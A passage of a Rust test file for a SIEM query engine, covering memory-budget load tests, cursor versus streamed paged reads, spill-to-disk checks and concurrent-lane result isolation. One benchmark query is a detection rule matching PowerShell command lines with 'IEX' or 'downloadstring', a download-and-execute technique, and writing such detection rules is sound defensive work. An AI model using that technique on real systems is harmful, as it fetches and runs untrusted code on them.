                    let (status, rows, _pages) = read_paged(&service, "*", &start, &end, body["limit"].as_u64().unwrap() as usize, 2_000).await;
                    (status, json!({"rows": rows}))
                } else {
                    post(&service, path, &body).await
                };
                let ms = t0.elapsed().as_millis();
                if trace {
                    eprintln!("END client={client} rule={name} status={status} ms={ms}");
                }
                let reason = value["reason"].as_str().unwrap_or("").to_string();
                if status != 200 {
                    eprintln!("client={client} rule={name} status={status} ms={ms} reason={reason} error={}",
                        value["error"].as_str().unwrap_or("").chars().take(200).collect::<String>());
                }
                out.push((name, status, reason, ms));
            }
            out
        }));
    }
    let mut results = Vec::new();
    for task in tasks {
        results.extend(task.await.unwrap());
    }
    let wall = started.elapsed().as_secs_f64();
    let cpu_cores = match (cpu_start, cgroup_cpu_usec()) {
        (Some(a), Some(b)) => format!("{:.2}", (b - a) as f64 / 1e6 / (wall + 1e-9)),
        _ => "n/a".into(),
    };
    let mut ms: Vec<u128> = results.iter().filter(|r| r.1 == 200).map(|r| r.3).collect();
    ms.sort_unstable();
    let pct = |p: f64| ms.get(((ms.len() as f64 * p) as usize).min(ms.len().saturating_sub(1))).copied().unwrap_or(0);
    let analyst = ["keyword", "stats", "sort_head", "medium_result", "timechart", "paged_20k"];
    for shape in analyst {
        let mut t: Vec<u128> = results.iter().filter(|r| r.1 == 200 && r.0 == shape).map(|r| r.3).collect();
        let failed = results.iter().filter(|r| r.1 != 200 && r.0 == shape).count();
        if t.is_empty() && failed == 0 {
            continue;
        }
        t.sort_unstable();
        let at = |p: f64| t.get(((t.len() as f64 * p) as usize).min(t.len().saturating_sub(1))).copied().unwrap_or(0);
        eprintln!("RESULT shape={shape} window_h={window_hours} ok={} failed={failed} p50_ms={} p95_ms={} max_ms={}", t.len(), at(0.5), at(0.95), at(1.0));
    }
    let mut analyst_ms: Vec<u128> = results.iter().filter(|r| r.1 == 200 && analyst.contains(&r.0.as_str())).map(|r| r.3).collect();
    analyst_ms.sort_unstable();
    if !analyst_ms.is_empty() {
        let at = |p: f64| analyst_ms[((analyst_ms.len() as f64 * p) as usize).min(analyst_ms.len() - 1)];
        eprintln!("RESULT analyst ok={} p50_ms={} p95_ms={} max_ms={}", analyst_ms.len(), at(0.5), at(0.95), at(1.0));
    }
    let mut by: BTreeMap<String, usize> = BTreeMap::new();
    for (_, status, reason, _) in &results {
        *by.entry(format!("{status}:{reason}")).or_default() += 1;
    }
    let mut slowest: BTreeMap<String, u128> = BTreeMap::new();
    for (name, status, _, t) in &results {
        if *status == 200 {
            let e = slowest.entry(name.clone()).or_default();
            *e = (*e).max(*t);
        }
    }
    let mut slowest: Vec<_> = slowest.into_iter().collect();
    slowest.sort_by_key(|entry| std::cmp::Reverse(entry.1));
    eprintln!("RESULT workload={} cap_mib={} clients={clients} threads={threads} requests={} per_min={:.1} ok_p50_ms={} ok_p95_ms={} ok_max_ms={}",
        if mixed { "mixed" } else if interactive { "interactive" } else { "rules" }, cap >> 20, results.len(), results.len() as f64 * 60.0 / wall, pct(0.5), pct(0.95), pct(1.0));
    eprintln!("RESULT memory open_hwm_mib={} open_cgroup_peak_mib={open_peak:?} peak_hwm_mib={} cgroup_peak_mib={:?} avg_cpu_cores={cpu_cores} cgroup_events={:?}",
        open_kib / 1024, vm_hwm_kib() / 1024, cgroup_file("memory.peak").map(|v| v.trim().parse::<u64>().unwrap_or(0) >> 20),
        cgroup_file("memory.events").map(|v| v.replace('\n', " ")));
    eprintln!("RESULT anon_peak_mib={} window_h={window_hours} rules={}", anon_peak.load(std::sync::atomic::Ordering::Relaxed) >> 20, rules.len());
    eprintln!("RESULT outcomes {by:?}");
    eprintln!("RESULT slowest {:?}", &slowest[..slowest.len().min(8)]);
    // Budget refusals are clean; compile errors of rules this engine cannot
    // run (400) are reported, not failures of the process.
    let broken: Vec<_> = by.iter().filter(|(k, _)| k.starts_with('5') && !k.ends_with(":query_budget_exhausted")).collect();
    assert!(broken.is_empty(), "server errors other than a clean budget refusal: {broken:?}");
    assert!(by.keys().any(|k| k.starts_with("200:")), "nothing succeeded");
}

/// A paged read as the search service does it: `QMB_PAGED=cursor` is the
/// NAN-3046 cursor protocol (one query[T] request, and one full execution,
/// per page); the default (`stream`) is the NAN-3060 streamed read (one
/// request, one execution, pages streamed back).
async fn read_paged(service: &Arc<QueryService>, query: &str, start: &str, end: &str, limit: usize, page: usize) -> (u16, usize, usize) {
    if std::env::var("QMB_PAGED").is_ok_and(|mode| mode == "cursor") {
        paged_read(service, query, start, end, limit, page).await
    } else {
        let (status, rows, pages, _, _) = stream_read(service, query, start, end, limit, page, false).await;
        (status, rows, pages)
    }
}

/// One `POST /v1/query/pages` read, consumed frame by frame (never held
/// whole); (status, rows, pages, uids when `collect`, the completion line).
async fn stream_read(service: &Arc<QueryService>, query: &str, start: &str, end: &str, limit: usize, page: usize, collect: bool)
    -> (u16, usize, usize, Vec<String>, Value) {
    let body = json!({"route": "broad_npl", "request_id": uuid::Uuid::new_v4().to_string(), "tenant_id": TENANT,
        "dataset": "logs", "query": query, "start": start, "end": end, "limit": limit, "offset": 0,
        "table_view": false, "use_cache": false});
    let (client, server) = tokio::net::UnixStream::pair().unwrap();
    tokio::spawn(service.clone().serve_stream(server));
    let (mut sender, connection) = hyper::client::conn::http1::handshake(TokioIo::new(client)).await.unwrap();
    tokio::spawn(connection);
    let request = Request::builder().method("POST").uri(format!("/v1/query/pages?page_rows={page}")).header("host", "cell")
        .header("content-type", "application/json").body(Full::new(Bytes::from(body.to_string()))).unwrap();
    let response = sender.send_request(request).await.unwrap();
    let status = response.status().as_u16();
    let mut body = response.into_body();
    if status != 200 {
        let bytes = body.collect().await.unwrap().to_bytes();
        eprintln!("stream_read status={status} body={}", String::from_utf8_lossy(&bytes).chars().take(300).collect::<String>());
        return (status, 0, 0, Vec::new(), Value::Null);
    }
    let (mut rows, mut pages, mut uids, mut done) = (0, 0, Vec::new(), Value::Null);
    let mut buffer: Vec<u8> = Vec::new();
    let mut take_line = |line: &[u8]| {
        if line.iter().all(u8::is_ascii_whitespace) {
            return;
        }
        let value: Value = serde_json::from_slice(line).unwrap();
        let page_rows = value.pointer("/result/rows").or_else(|| value.get("rows")).and_then(Value::as_array);
        match page_rows {
            Some(page_rows) => {
                if value.get("result").is_some() {
                    assert_eq!(value["result"]["newest_first_event_rows"], json!(true), "raw search must stream newest first");
                }
                pages += 1;
                rows += page_rows.len();
                if collect {
                    uids.extend(page_rows.iter().map(|row| row.pointer("/metadata/uid").or_else(|| row.get("metadata.uid"))
                        .and_then(Value::as_str).unwrap().to_string()));
                }
            }
            None => done = value,
        }
    };
    while let Some(frame) = body.frame().await {
        if let Ok(data) = frame.unwrap().into_data() {
            buffer.extend_from_slice(&data);
            while let Some(at) = buffer.iter().position(|byte| *byte == b'\n') {
                let line: Vec<u8> = buffer.drain(..=at).collect();
                take_line(&line);
            }
        }
    }
    take_line(&buffer);
    let status = if done["done"] == json!(true) { 200 } else {
        eprintln!("stream_read ended without completion: {done}");
        done["status"].as_u64().unwrap_or(500) as u16
    };
    (status, rows, pages, uids, done)
}

/// NAN-3060 regression: a paged read runs its query ONCE.
///
/// Builds a small tenant (6,000 events over 30 min) and reads 5,000 rows
/// in 500-row pages both ways. The cursor protocol costs at least one
/// native execution per page; the streamed read is exactly one native
/// statement, returns the same rows in the same order, and its completion
/// line says `result_statements: 1`.
///
/// ```text
/// NANO_CHDB_LIBRARY_PATH=… NANO_CHDB_LIBRARY_SHA256=… NANO_LAKE_COMPILER=… \
///   cargo test -p nanosiem-lake-worker --test query_memory_budget_native \
///   streamed_paged_read_executes_the_query_once -- --ignored --nocapture
/// ```
#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
#[ignore = "native: NANO_CHDB_LIBRARY_PATH, NANO_CHDB_LIBRARY_SHA256, NANO_LAKE_COMPILER"]
async fn streamed_paged_read_executes_the_query_once() {
    let root = tempfile::tempdir().unwrap();
    let span_ms = 30 * 60_000_i64;
    let rows = 6_000;
    let now = chrono::Utc::now();
    {
        let parts = LocalObjectStore::new(root.path().join("parts")).unwrap();
        let sources_dir = root.path().join("sources");
        std::fs::create_dir_all(sources_dir.join("bronze")).unwrap();
        let sources = LocalObjectStore::new(&sources_dir).unwrap();
        let spool = SpoolQueue::new(root.path().join("spool"), TENANT).unwrap();
        let signer = signer();
        let mut cfg = IngestConfig::new(TENANT, root.path().join("work"));
        cfg.flush_interval_override_ms = Some(1_000);
        let now_ms = now.timestamp_millis();
        let mut ingestor = Ingestor::open(cfg, &parts, &sources, &spool as &dyn NoticeQueue, &signer, signer.trusted(),
            BronzeIngestEnricher::disabled(), &seed_schema(), now_ms).await.expect("ingest opens");
        let batch = (0..rows)
            .map(|i| row(i, &(now - chrono::Duration::milliseconds(span_ms - span_ms * i as i64 / rows as i64)).to_rfc3339()))
            .collect::<Vec<_>>();
        write_bronze(&sources_dir.join("bronze/0000.parquet"), &batch);
        nanosiem_lake_worker::bronze::admit_bronze_files(&[sources_dir.join("bronze/0000.parquet")], TENANT).expect("bronze admitted");
        spool.deliver(&SourceNotice { tenant_id: TENANT.into(), key: "bronze/0000.parquet".into(), version: "1".into(), bytes: 0,
            sha256: None, edge_sha256: None, notified_at_ms: now_ms }).unwrap();
        ingestor.tick(now_ms + 1_000).await.expect("ingest admits");
        ingestor.flush_now(now_ms + 5_000).await.expect("ingest flushes");
    }
    let (service, _state) = open_service(root.path(), 3 * GIB, false, None, 2, false).await;
    let start = (now - chrono::Duration::hours(1)).to_rfc3339();
    let end = (now + chrono::Duration::minutes(1)).to_rfc3339();
    let statements = || { let s = service.engine().executor().status(); s.completed + s.failed };
    // Warm every per-process memo (file proofs, membership, schema).
    assert_eq!(paged_read(&service, "*", &start, &end, 500, 500).await.0, 200);

    let before = statements();
    let (status, cursor_rows, cursor_pages) = paged_read(&service, "*", &start, &end, 5_000, 500).await;
    let cursor = statements() - before;
    assert_eq!((status, cursor_rows, cursor_pages), (200, 5_000, 10));

    let before = statements();
    let (status, stream_rows, stream_pages, uids, done) = stream_read(&service, "*", &start, &end, 5_000, 500, true).await;
    let streamed = statements() - before;
    eprintln!("native statements: cursor 10 pages {cursor}, streamed 10 pages {streamed}; done={done}");
    assert_eq!((status, stream_rows, stream_pages), (200, 5_000, 10));
    assert_eq!(done["result_statements"], json!(1));
    assert_eq!(done["has_more"], json!(true));
    // The first cursor page may come from the warm-up's result cache; every
    // later page is a fresh execution.
    assert!(cursor >= 9, "the cursor protocol executes per page ({cursor})");
    assert_eq!(streamed, 1, "a streamed read of 10 pages is one native statement");

    // Same rows, same order: newest first, exactly the cursor protocol's.
    let mut cursor_uids = Vec::new();
    let mut cursor: Option<(String, String)> = None;
    while cursor_uids.len() < 5_000 {
        let mut body = json!({"route": "broad_npl", "request_id": uuid::Uuid::new_v4().to_string(), "tenant_id": TENANT,
            "dataset": "logs", "query": "*", "start": start, "end": end, "limit": 1_001, "offset": 0, "table_view": false, "use_cache": false});
        if let Some((time, uid)) = &cursor {
            body["cursor_time"] = json!(time);
            body["cursor_event_uid"] = json!(uid);
        }
        let value = post_full(&service, &body).await;
        let page = value["result"]["rows"].as_array().unwrap();
        let page = &page[..page.len().min(1_000)];
        cursor_uids.extend(page.iter().map(|row| row.pointer("/metadata/uid").and_then(Value::as_str).unwrap().to_string()));
        let last = page.last().unwrap();
        let time = chrono::NaiveDateTime::parse_from_str(last["time"].as_str().unwrap(), "%Y-%m-%d %H:%M:%S%.f").map(|t| t.and_utc())
            .or_else(|_| chrono::DateTime::parse_from_rfc3339(last["time"].as_str().unwrap()).map(|t| t.with_timezone(&chrono::Utc))).unwrap();
        cursor = Some((time.to_rfc3339_opts(chrono::SecondsFormat::Micros, true), last["metadata"]["uid"].as_str().unwrap().to_string()));
    }
    assert_eq!(uids, cursor_uids, "the streamed read returns the cursor protocol's rows in its order");
    // An unordered projection is never paged: its SQL has no event order
    // for a cursor (or page boundaries) to follow, so both protocols run it
    // as one request (NAN-3060: cursor pages over `| table` repeated and
    // skipped rows).
    for query in ["* | table time, metadata.uid, raw_data_size", "* | fields time, metadata.uid", "* | sort -time"] {
        let single = post_full(&service, &json!({"route": "broad_npl", "request_id": uuid::Uuid::new_v4().to_string(), "tenant_id": TENANT,
            "dataset": "logs", "query": query, "start": start, "end": end, "limit": 3_000, "offset": 0, "table_view": false, "use_cache": false})).await;
        assert_eq!(single["result"]["newest_first_event_rows"], json!(false), "{query}");
    }
    // No duplicate and no missing row across pages: the pages concatenate
    // to exactly the one-statement answer.
    for query in ["*", "* | eval probe=1"] {
        let (status, rows, pages, streamed, _) = stream_read(&service, query, &start, &end, 5_000, 700, true).await;
        assert_eq!((status, rows, pages), (200, 5_000, 8), "{query}");
        let unique = streamed.iter().collect::<std::collections::BTreeSet<_>>();
        assert_eq!(unique.len(), streamed.len(), "{query}: a row appears on two pages");
        let single = post_full(&service, &json!({"route": "broad_npl", "request_id": uuid::Uuid::new_v4().to_string(), "tenant_id": TENANT,
            "dataset": "logs", "query": query, "start": start, "end": end, "limit": 5_000, "offset": 0, "table_view": false, "use_cache": false})).await;
        let single = single["result"]["rows"].as_array().unwrap().iter()
            .map(|row| row.pointer("/metadata/uid").or_else(|| row.get("metadata.uid")).and_then(Value::as_str).unwrap().to_string())
            .collect::<Vec<_>>();
        assert_eq!(streamed, single, "{query}: pages differ from the single-statement result");
    }

    // A reader that disconnects mid-read frees the slot: the next read is served.
    {
        let body = json!({"route": "broad_npl", "request_id": "abandon", "tenant_id": TENANT, "dataset": "logs", "query": "*",
            "start": start, "end": end, "limit": 5_000, "offset": 0, "table_view": false, "use_cache": false});
        let (client, server) = tokio::net::UnixStream::pair().unwrap();
        tokio::spawn(service.clone().serve_stream(server));
        let (mut sender, connection) = hyper::client::conn::http1::handshake(TokioIo::new(client)).await.unwrap();
        let connection = tokio::spawn(connection);
        let request = Request::builder().method("POST").uri("/v1/query/pages?page_rows=100").header("host", "cell")
            .header("content-type", "application/json").body(Full::new(Bytes::from(body.to_string()))).unwrap();
        let response = sender.send_request(request).await.unwrap();
        assert_eq!(response.status().as_u16(), 200);
        drop(response);
        drop(sender);
        connection.abort();
    }
    for _ in 0..service.engine().admission_slots() + 1 {
        let (status, rows, _, _, _) = stream_read(&service, "*", &start, &end, 300, 100, false).await;
        assert_eq!((status, rows), (200, 300));
    }
}

async fn post_full(service: &Arc<QueryService>, body: &Value) -> Value {
    let (client, server) = tokio::net::UnixStream::pair().unwrap();
    tokio::spawn(service.clone().serve_stream(server));
    let (mut sender, connection) = hyper::client::conn::http1::handshake(TokioIo::new(client)).await.unwrap();
    tokio::spawn(connection);
    let request = Request::builder().method("POST").uri("/v1/query").header("host", "cell").header("content-type", "application/json")
        .body(Full::new(Bytes::from(body.to_string()))).unwrap();
    let response = sender.send_request(request).await.unwrap();
    assert_eq!(response.status().as_u16(), 200);
    serde_json::from_slice(&response.into_body().collect().await.unwrap().to_bytes()).unwrap()
}

/// Read `limit` rows of `query` in `page` pages with the newest-first
/// cursor, as the search service does; (status, rows, pages).
async fn paged_read(service: &Arc<QueryService>, query: &str, start: &str, end: &str, limit: usize, page: usize) -> (u16, usize, usize) {
    let (mut rows, mut pages) = (0, 0);
    let mut cursor: Option<(String, String)> = None;
    let mut page = page;
    while rows < limit {
        let want = page.min(limit - rows);
        let mut body = json!({"route": "broad_npl", "request_id": uuid::Uuid::new_v4().to_string(), "tenant_id": TENANT,
            "dataset": "logs", "query": query, "start": start, "end": end, "limit": want + 1, "offset": 0,
            "table_view": false, "use_cache": false});
        if let Some((time, uid)) = &cursor {
            body["cursor_time"] = json!(time);
            body["cursor_event_uid"] = json!(uid);
        }
        let (client, server) = tokio::net::UnixStream::pair().unwrap();
        tokio::spawn(service.clone().serve_stream(server));
        let (mut sender, connection) = hyper::client::conn::http1::handshake(TokioIo::new(client)).await.unwrap();
        tokio::spawn(connection);
        let request = Request::builder().method("POST").uri("/v1/query").header("host", "cell").header("content-type", "application/json")
            .body(Full::new(Bytes::from(body.to_string()))).unwrap();
        let response = sender.send_request(request).await.unwrap();
        let status = response.status().as_u16();
        let bytes = response.into_body().collect().await.unwrap().to_bytes();
        if status == 503 && page > 64 {
            page /= 2;
            continue;
        }
        if status != 200 {
            eprintln!("paged_read status={status} body={}", String::from_utf8_lossy(&bytes).chars().take(300).collect::<String>());
            return (status, rows, pages);
        }
        let value: Value = serde_json::from_slice(&bytes).unwrap();
        assert_eq!(value["result"]["newest_first_event_rows"], json!(true), "raw search must be cursor-continuable");
        let page_rows = value["result"]["rows"].as_array().unwrap();
        pages += 1;
        let has_more = page_rows.len() > want;
        let taken = page_rows.len().min(want);
        rows += taken;
        if !has_more || taken == 0 {
            return (200, rows, pages);
        }
        let last = &page_rows[taken - 1];
        let time = last["time"].as_str().map(str::to_string).unwrap_or_else(|| last["time"].to_string());
        let uid = last.get("metadata.uid").or_else(|| last.pointer("/metadata/uid")).and_then(Value::as_str).unwrap().to_string();
        let time = chrono::DateTime::parse_from_rfc3339(&time).map(|t| t.with_timezone(&chrono::Utc))
            .or_else(|_| chrono::NaiveDateTime::parse_from_str(&time, "%Y-%m-%d %H:%M:%S%.f").map(|t| t.and_utc()))
            .unwrap_or_else(|_| panic!("row time {time}"));
        cursor = Some((time.to_rfc3339_opts(chrono::SecondsFormat::Micros, true), uid));
    }
    (200, rows, pages)
}

#[tokio::test(flavor = "multi_thread", worker_threads = 8)]
#[ignore = "native load test: NANO_CHDB_LIBRARY_PATH, NANO_CHDB_LIBRARY_SHA256, NANO_LAKE_COMPILER, QMB_DIR; run under a memory cgroup"]
async fn concurrent_load() {
    let _ = tracing_subscriber::fmt().with_max_level(tracing::Level::INFO).try_init();
    let root = fixture_dir();
    assert!(root.join("fixture.json").exists(), "run build_fixture first");
    let legacy = std::env::var("QMB_MODE").is_ok_and(|mode| mode == "legacy");
    let cap = env_u64("QMB_CAP_BYTES", 3 * GIB);
    let clients = env_u64("QMB_CONCURRENCY", 4) as usize;
    let seconds = env_u64("QMB_SECONDS", 60);
    let state = tempfile::tempdir_in(&root).unwrap();

    let trusted = signer().trusted();
    let store: Arc<dyn ObjectStore> = Arc::new(LocalObjectStore::new(root.join("parts")).unwrap());
    let view = PartLogView::open(store.as_ref(), TENANT, trusted.clone()).await.unwrap();
    let head = view.head().map_or(0, |(seq, _)| seq);
    let bucket = "qmb-local";
    let cache = ReaderObjectCache::open(ReaderObjectCacheSettings {
        root: state.path().join("cache"), max_bytes: 8 * GIB, query_max_bytes: 2 * GIB,
        fetch_concurrency: 8, fetch_deadline: Duration::from_secs(60),
    }, TENANT, bucket, &parts_key_prefix(TENANT).unwrap(),
    Arc::new(StoreObjectSource::local(bucket, store.clone(), root.join("parts")))).unwrap();
    let fetcher = PartFetcher::new(TENANT, bucket, store.clone(), trusted, cache).unwrap();
    let runtime = NativeChdb::load_verified(
        std::env::var("NANO_CHDB_LIBRARY_PATH").unwrap(),
        &std::env::var("NANO_CHDB_LIBRARY_SHA256").unwrap(),
    ).unwrap();
    std::mem::forget(runtime.clone());
    // The same arithmetic as `server::open_engine_timed`, or the pre-fix one.
    let (server_bytes, lanes, per_query, result_limit) = if legacy {
        let server = cap.saturating_sub(128 << 20).max(256 << 20);
        (server, 2, server.min(4 * GIB).max(64 << 20), None)
    } else {
        let budget = QueryMemoryBudget::derive(cap, None);
        (budget.server_bytes, budget.concurrency, budget.per_query_bytes, Some(budget.result_bytes))
    };
    eprintln!("mode={} cap={cap} server={server_bytes} lanes={lanes} per_query={per_query} result_limit={result_limit:?} clients={clients}",
        if legacy { "legacy" } else { "budget" });
    let mut executor = NativeExecutor::start_with_server_memory_limit(runtime.clone(), lanes, "parts", ExecutorMode::ReadOnly, Some(server_bytes)).unwrap();
    if let Some(limit) = result_limit {
        executor = executor.with_result_limit(limit);
    }
    let writer = NativeExecutor::start_with_server_memory_limit(runtime, 1, "parts-rw", ExecutorMode::ReadWrite, Some(server_bytes)).unwrap();
    let engine = PartQueryEngine::new(EngineSettings {
        tenant_id: TENANT.into(), bucket: bucket.into(),
        compiler: std::env::var("NANO_LAKE_COMPILER").unwrap().into(),
        max_query_bytes: 64 * GIB, max_memory_bytes: per_query, max_execution_seconds: 120, threads: 3,
    }, store, view, fetcher, executor).unwrap().with_writer(writer).with_state_dir(state.path());
    let gate = DetectionGate::new(Some(state.path().to_path_buf()), head).unwrap();
    let service = QueryService::new(engine, gate, state.path().to_path_buf(), "compiler".into(), "chdb".into(), None, 24, None);
    service.clone().start_ready_with_background_prewarm();
    let baseline_kib = vm_hwm_kib();

    let now = chrono::DateTime::from_timestamp(chrono::Utc::now().timestamp(), 0).unwrap();
    let (start, end) = ((now - chrono::Duration::hours(24)).to_rfc3339(), now.to_rfc3339());
    let queries: Vec<(&str, String, usize)> = vec![
        ("keyword", "powershell".into(), 1_000),
        ("stats", "metadata.log_source=windows_sysmon | stats count by device.hostname, actor.user.name".into(), 10_000),
        ("sort_head", "* | sort -raw_data_size | head 200".into(), 200),
        ("detection", "metadata.log_source=\"windows_sysmon\" | where class_uid=1007 AND activity_id=1 | where process.name=\"powershell.exe\" OR process.name=\"pwsh.exe\" | where process.cmd_line CONTAINS \"IEX\" OR process.cmd_line CONTAINS \"downloadstring\" | risk score=50 entity=device.hostname factor=\"Suspicious PowerShell\" | table time, device.hostname, actor.user.name, process.name, process.cmd_line, risk_score".into(), 1_000),
        ("heavy_group_by", "* | stats count by raw_data | sort -count | head 10".into(), 10),
        ("heavy_rule", "* | eval body=lower(raw_data) | eval risk=if(match(body, \"powershell\"), 50, 10) | stats count, sum(risk) as risk_sum, values(device.hostname) as hosts by body | where count > 0 | sort -risk_sum | head 50".into(), 50),
        ("large_result", "* | head 200000".into(), 200_000),
        ("medium_result", "* | head 20000".into(), 20_000),
        // A rule's `| prevalence enrich=true window=30d` stage: the search
        // service looks up every result row's artifacts over 30 d.
        ("prevalence_30d", String::new(), 10_000),
        // The search service's paged read of a 200k-row raw search (NAN-3046):
        // 2000-row pages continued by the last row's (time, metadata.uid).
        ("paged_200k", "*".into(), 200_000),
    ];
    // QMB_ONLY=name[,name]: run just those shapes (one-query repros).
    let queries = match std::env::var("QMB_ONLY") {
        Ok(only) => queries.into_iter().filter(|(name, _, _)| only.split(',').any(|o| o == *name)).collect(),
        Err(_) => queries,
    };
    let deadline = Instant::now() + Duration::from_secs(seconds);
    let mut tasks = Vec::new();
    for client in 0..clients {
        let service = service.clone();
        let queries = queries.clone();
        let (start, end) = (start.clone(), end.clone());
        tasks.push(tokio::spawn(async move {
            let mut outcomes: BTreeMap<String, usize> = BTreeMap::new();
            let mut n = client;
            while Instant::now() < deadline {
                let (name, query, limit) = &queries[n % queries.len()];
                n += 1;
                let (path, body) = if *name == "prevalence_30d" {
                    ("/v1/prevalence/lookup", json!({"request_id": uuid::Uuid::new_v4().to_string(), "tenant_id": TENANT, "window": "30d",
                        "artifacts": (0..*limit).map(|i| hash(i * 3 + 1)).collect::<Vec<_>>()}))
                } else {
                    ("/v1/query", json!({"route": "broad_npl", "request_id": uuid::Uuid::new_v4().to_string(), "tenant_id": TENANT,
                        "dataset": "logs", "query": query, "start": start, "end": end, "limit": limit, "offset": 0,
                        "table_view": false, "use_cache": false}))
                };
                let started = Instant::now();
                if *name == "paged_200k" {
                    let (status, rows, pages) = read_paged(&service, query, &start, &end, *limit, 2_000).await;
                    eprintln!("client={client} query={name} status={status} ms={} rows={rows} pages={pages}", started.elapsed().as_millis());
                    *outcomes.entry(format!("{name}:{status}:{}", if status == 200 { "clean" } else { "failed" })).or_default() += 1;
                    continue;
                }
                let (status, value) = post(&service, path, &body).await;
                eprintln!("client={client} query={name} status={status} ms={} reason={} rows={} error={}", started.elapsed().as_millis(),
                    value["reason"], value["rows"], value["error"].as_str().unwrap_or("").chars().take(160).collect::<String>());
                let clean = status == 200 || ((status == 503 || status == 429) && value["reason"] == "query_budget_exhausted");
                *outcomes.entry(format!("{name}:{status}:{}", if clean { "clean" } else { value["reason"].as_str().unwrap_or("?") })).or_default() += 1;
            }
            outcomes
        }));
    }
    let mut outcomes: BTreeMap<String, usize> = BTreeMap::new();
    for task in tasks {
        for (key, count) in task.await.unwrap() {
            *outcomes.entry(key).or_default() += count;
        }
    }
    let peak_kib = vm_hwm_kib();
    eprintln!("RESULT mode={} clients={clients} baseline_hwm_mib={} peak_hwm_mib={} cgroup_peak={:?} cgroup_events={:?}",
        if legacy { "legacy" } else { "budget" }, baseline_kib / 1024, peak_kib / 1024,
        cgroup_file("memory.peak").map(|v| v.trim().parse::<u64>().unwrap_or(0) >> 20),
        cgroup_file("memory.events").map(|v| v.replace('\n', " ")));
    eprintln!("RESULT outcomes {outcomes:?}");
    let unclean = outcomes.iter().filter(|(key, _)| !key.ends_with(":clean")).collect::<Vec<_>>();
    assert!(unclean.is_empty(), "responses other than 200 or a clean budget refusal: {unclean:?}");
    assert!(outcomes.keys().any(|key| key.contains(":200:")), "no query succeeded");
}

/// Heavy GROUP BY / ORDER BY spill under a small per-statement cap, into
/// `$TMPDIR` (query[T] points TMPDIR at its role tmp dir: the container's
/// /tmp is read-only). Prints where chDB spilled.
#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
#[ignore = "native: NANO_CHDB_LIBRARY_PATH, NANO_CHDB_LIBRARY_SHA256"]
async fn heavy_aggregation_spills_to_tmpdir() {
    let runtime = NativeChdb::load_verified(
        std::env::var("NANO_CHDB_LIBRARY_PATH").unwrap(),
        &std::env::var("NANO_CHDB_LIBRARY_SHA256").unwrap(),
    ).unwrap();
    std::mem::forget(runtime.clone());
    let executor = NativeExecutor::start_with_server_memory_limit(runtime, 1, "spill", ExecutorMode::ReadOnly, Some(768 << 20)).unwrap();
    let cap: u64 = 256 << 20;
    for (name, sql) in [
        ("group_by_2m_distinct", format!("SELECT count() AS c FROM (SELECT toString(number) || repeat('x', 64) AS k, count() FROM numbers(2000000) GROUP BY k) \
            SETTINGS max_threads=2, max_memory_usage={cap}, max_bytes_before_external_group_by={}, max_temporary_data_on_disk_size_for_query={}", cap / 2, cap * 16)),
        ("sort_2m_wide", format!("SELECT sum(length(k)) AS c FROM (SELECT toString(number) || repeat('y', 200) AS k FROM numbers(2000000) ORDER BY k DESC) \
            SETTINGS max_threads=2, max_memory_usage={cap}, max_bytes_before_external_sort={}, max_temporary_data_on_disk_size_for_query={}", cap / 2, cap * 16)),
    ] {
        let result = executor.execute_sql(sql, vec![]).await;
        eprintln!("RESULT {name} tmpdir={:?} -> {}", std::env::var("TMPDIR").ok(),
            match &result { Ok(output) => String::from_utf8_lossy(&output.data).trim().to_string(), Err(error) => format!("ERR {error}") });
        assert!(result.is_ok(), "{name} must spill and complete: {result:?}");
    }
}

/// Two lanes, concurrent statements with distinguishable results: every
/// caller must get its own statement's output (the load test saw small
/// statements come back with ~40 MB results only under concurrency).
#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
#[ignore = "native: NANO_CHDB_LIBRARY_PATH, NANO_CHDB_LIBRARY_SHA256"]
async fn concurrent_lanes_return_their_own_results() {
    let runtime = NativeChdb::load_verified(
        std::env::var("NANO_CHDB_LIBRARY_PATH").unwrap(),
        &std::env::var("NANO_CHDB_LIBRARY_SHA256").unwrap(),
    ).unwrap();
    std::mem::forget(runtime.clone());
    let executor = Arc::new(NativeExecutor::start_with_server_memory_limit(runtime, 2, "swap", ExecutorMode::ReadOnly, Some(2 * GIB)).unwrap());
    let mut tasks = Vec::new();
    for worker in 0..4_u64 {
        let executor = executor.clone();
        tasks.push(tokio::spawn(async move {
            let mut wrong = 0;
            for i in 0..200_u64 {
                let (sql, expect_big) = if (worker + i) % 2 == 0 {
                    (format!("SELECT {worker} AS w, {i} AS i, repeat('z', 200) AS pad FROM numbers(100000) SETTINGS max_threads=2"), true)
                } else {
                    (format!("SELECT {worker} AS w, {i} AS i SETTINGS max_threads=1"), false)
                };
                let output = executor.execute_sql(sql, vec![]).await.unwrap();
                let text = String::from_utf8_lossy(&output.data);
                let first = text.lines().next().unwrap_or("");
                let own = first.contains(&format!("\"w\":{worker},")) || first.contains(&format!("\"w\":\"{worker}\""));
                let own = own && (first.contains(&format!("\"i\":{i},")) || first.contains(&format!("\"i\":{i}}}")) || first.contains(&format!("\"i\":\"{i}\"")));
                let lines = text.lines().count();
                if !own || (expect_big && lines != 100_000) || (!expect_big && lines != 1) {
                    wrong += 1;
                    eprintln!("WRONG worker={worker} i={i} big={expect_big} lines={lines} first={}", first.chars().take(80).collect::<String>());
                }
            }
            wrong
        }));
    }
    let mut wrong = 0;
    for task in tasks {
        wrong += task.await.unwrap();
    }
    assert_eq!(wrong, 0, "results crossed between concurrent lanes");
}

/// Spill cost (Dan, 2026-09-29): the same heavy statements with memory to
/// spare (no spill) vs the 3 GiB role's per-statement budget vs a 256 MiB
/// cap, all spilling into the working directory. Prints wall times.
#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
#[ignore = "native: NANO_CHDB_LIBRARY_PATH, NANO_CHDB_LIBRARY_SHA256; timing report"]
async fn spill_timings() {
    let runtime = NativeChdb::load_verified(
        std::env::var("NANO_CHDB_LIBRARY_PATH").unwrap(),
        &std::env::var("NANO_CHDB_LIBRARY_SHA256").unwrap(),
    ).unwrap();
    std::mem::forget(runtime.clone());
    let executor = NativeExecutor::start_with_server_memory_limit(runtime, 1, "spill", ExecutorMode::ReadOnly, Some(12 * GIB)).unwrap();
    let budget = QueryMemoryBudget::derive(3 * GIB, None).per_query_bytes;
    let queries = [
        ("group_by_10m_distinct", "SELECT count() AS c FROM (SELECT toString(number) || repeat('x', 64) AS k, count() FROM numbers(10000000) GROUP BY k)"),
